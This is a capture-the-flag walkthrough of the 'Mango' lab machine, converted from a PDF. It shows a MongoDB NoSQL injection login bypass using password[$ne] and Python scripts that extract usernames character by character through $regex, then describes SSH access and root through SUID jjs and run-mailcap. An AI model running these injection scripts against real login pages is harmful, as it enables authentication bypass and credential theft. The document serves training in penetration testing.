# Mango

*Converted from: Mango.pdf*

---

# Mango

14 [th] April 2020 / Document No D20.100.70


Prepared By: MinatoTW


Machine Author(s): MrR3boot


Difficulty: Medium


Classification: Official


## **Synopsis**

Mango is a medium difficulty Linux machine hosting a website that is found vulnerable to NoSQL

injection. The NoSQL database is discovered to be MongoDB, from which we exfiltrate user

credentials. We can use one set of credentials to gain a foothold using SSH, and the other to

move laterally within the box. A SUID binary is then exploited to escalate our privileges to root.
### **Skills Required**


Enumeration

Scripting
### **Skills Learned**


NoSQL Injection

GTFOBins Abuse


## **Enumeration**

### **Nmap**



The Nmap scan reveals ports 22, 80 and 443 running their usual services. Additionally, Nmap

found a vhost named staging-order.mango.htb referred to in the SSL certificate. Let's add

mango.htb and staging-order.mango.htb to /etc/hosts, and proceed with our enumeration.
### **Apache**


Browsing to port 80 returns a 403 forbidden error, however, the HTTPS website reveals a search

engine.


The page just refreshes and doesn't return any results on searching. The second vhost is found to

host the same page on HTTPS. However, the HTTP website reveals a login page.


Attempting to login using common default credentials fail. Let's intercept the request in Burp and

examine the login request.


Injecting quotes doesn't return an error or change the response. As the website is running PHP,

we can try to bypass the authentication using type juggling. This can be done by adding [] to the

request parameters, which makes PHP use them as an array. This will bypass authentication if

there's any kind of weak comparison in place.


This results in a failed attempt as well. Let's try a NoSQL injection attack such as a MongoDB

authentication bypass. MongoDB uses the $ne [(not equal) operator to compare values. This](https://docs.mongodb.com/manual/reference/operator/query/ne/)

operator can be passed to PHP through the array syntax, which will ultimately get injected into

the MongoDB query.


Here's an example MongoDB query to find a user:


The query above will result in a failed login due to an incorrect password. Sending a request with

the parameter password[$ne]=admin would result in the query:





This returns true because the password for admin is not equal to admin, which bypasses the

login successfully.

Injection of $ne is found to be successful and the page redirects us to home.php as admin .

Repeating the same process with a login request returns the following page.

### **MongoDB Injection**


As the home page doesn't return any useful information., we can attempt to exfiltrate data from

the Mongo database using the [$regex](https://docs.mongodb.com/manual/reference/operator/query/r%20egex/) operator. The $regex operator can be used to find data

using regular expressions. For example, the following query will search for usernames matching

the regex a.*, which matches any username containing an a .




Replacing a.* with b.* returns a 200 response, which means there's no username with b in it.

Let's write a script to discover usernames using this logic.



The Python2 script above will list all characters present in all the usernames in the DB.

The script found 7 valid characters, i.e. a, d, g, i, m, n, o . Now we have reduced the

character set, we can attempt to reveal the actual usernames. The caret symbol ^ in regex is

used to mark the beginning of a word. For example, the pattern ^a.* will return true only if the

username starts with an a . Similarly, the pattern ^ad.* returns true if a username starting with

ad exists and so on. Let's update the script to include this logic.


from requests import post


from string import lowercase


url = 'http://staging-order.mango.htb/'


valid = ['a', 'd', 'g', 'i', 'm', 'n', 'o']


def sendPayload(word):


regex = '^{}.*'.format(word)


data = { 'username[$regex]' : regex, 'password[$ne]' : 'password', 'login' :


'login' }


response = post(url, data = data, allow_redirects=False)


if response.status_code == 302:


return word


else:


return None


def getUser():


for char in valid:


if sendPayload(char) != None:


print "Found username starting with {}".format(char)


if __name__ == '__main__':


getUser()


The script loops through the character set to find usernames beginning with any one of those

letters.

The DB is found to contain usernames starting with a and m respectively. Let's update the script

to reveal the actual usernames.


from requests import post


from string import lowercase


url = 'http://staging-order.mango.htb/'


valid = ['a', 'd', 'g', 'i', 'm', 'n', 'o']


def sendPayload(word):


for char in valid:


regex = '^{}.*'.format(word + char)


data = { 'username[$regex]' : regex, 'password[$ne]' : 'password', 'login' :


'login' }


response = post(url, data = data, allow_redirects=False)


if response.status_code == 302:


return char


return None


def getUser():


for ch in ['a', 'm']:


username = ch


while True:


char = sendPayload(username)


if char != None:


username += char


else:


print "Username found: {}".format(username)


break


if __name__ == '__main__':


getUser()

The script loops through the valid characters and finds usernames starting with a and m . HTTP

responses containing a 302 status code (URL redirect) contain a valid character, which is

outputted by the script.

This identifies two valid usernames, admin and mango . We can attempt to identify their

passwords using the same logic.



The script loops through all printable ASCII characters. It returns valid character sets for both

users separately, which reduces the number of requests in the next stage.


## **Foothold**

Now that we have character sets for both passwords, let's update the script to find the

passwords. The characters ^, $ , |, \\ and . should be escaped with a backslash as they hold

special meaning in regex and can result in false negatives.



The script uses valid character sets for both users and reveals their password character by

character.

The passwords for both users were successfully revealed. The credentials for user mango can be

used to login via SSH.


## **Lateral Movement**

Looking at other users, it's found that the user admin is present.


Let's try using the password found previously to switch to this user.


The password is valid and gives us access to the user flag.


## **Privilege Escalation**

Searching for SUID files reveals two uncommon binaries, run-mailcap and jjs .


According to GTFOBins, [run-mailcap](https://gtfobins.github.io/gtfobins/run-mailcap/) and the [jjs](https://gtfobins.github.io/gtfobins/jjs/#suid) utility can be used to execute commands as root.

Let's spawn a shell using Java's Runtime.Exec() function.

The command above will copy /bin/sh to /tmp and make it an SUID.


We successfully used this SUID binary to escalate our privileges to root.


